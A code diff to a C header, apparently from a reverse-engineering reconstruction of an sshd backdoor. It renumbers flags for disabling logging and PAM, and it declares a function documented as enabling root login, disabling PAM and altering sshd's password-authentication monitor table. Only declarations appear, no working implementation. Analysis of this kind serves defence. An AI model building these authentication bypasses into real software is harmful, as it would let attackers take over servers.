@@ -1474,11 +1474,11 @@ enum CommandFlags1 {
 	/**
 	 * @brief the data block contains 8 additional bytes
 	 */
-	CMDF_8BYTES = 1 << 0,
+	CMDF_8BYTES = 0x1,
 	/**
 	 * @brief disable all logging by setting mask 0x80000000
 	 */
-	CMDF_SETLOGMASK = 1 << 2,
+	CMDF_SETLOGMASK = 0x4,
 	/**
 	 * @brief if set, disables PAM authentication
 	 */
@@ -2879,6 +2879,25 @@ extern BOOL verify_signature(
 	u64 signed_data_size,
 	u8 *signature,
 	u8 *ed448_raw_key,
+	global_context_t *global_ctx
+);
+
+/**
+ * @brief Patches the sshd configuration
+ * 
+ * @param skip_root_patch TRUE to keep current configuration, FALSE to enable root login
+ * @param disable_pam TRUE to disable PAM, FALSE to keep current configuration
+ * @param replace_monitor_reqtype TRUE to replace the `type` field in `struct mon_table`
+ * for `MONITOR_REQ_AUTHPASSWORD`. FALSE to increment it by 1 (from `MONITOR_REQ_AUTHPASSWORD` to `MONITOR_ANS_AUTHPASSWORD`)
+ * @param monitor_reqtype the new value to apply, if @p replace_monitor_reqtype is TRUE
+ * @param global_ctx
+ * @return BOOL TRUE if successful, FALSE if modifications couldn't be applied
+ */
+extern BOOL sshd_patch_variables(
+	BOOL skip_root_patch,
+	BOOL disable_pam,
+	BOOL replace_monitor_reqtype,
+	int monitor_reqtype,
 	global_context_t *global_ctx
 );
 
